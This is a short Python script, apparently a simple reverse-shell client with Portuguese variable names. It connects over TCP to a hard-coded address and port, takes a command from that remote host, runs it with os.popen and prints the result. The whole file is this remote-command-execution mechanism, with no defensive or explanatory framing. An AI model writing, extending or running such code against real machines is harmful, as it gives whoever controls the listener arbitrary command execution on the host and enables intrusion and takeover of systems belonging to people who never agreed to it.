from socket import socket, AF_INET, SOCK_STREAM
from os import popen


ip_origem = '192.168.1.67'
porta_conexao = 2731
cliente = socket(AF_INET, SOCK_STREAM)
cliente.connect((ip_origem, porta_conexao))

def recebe_comando():
    while True:
        comando = cliente.recv(2048).decode()
        return comando
      
def executa_comando():
    comando = recebe_comando()
    execucao = popen(comando).read()
    return execucao

saida = executa_comando()
print(saida)
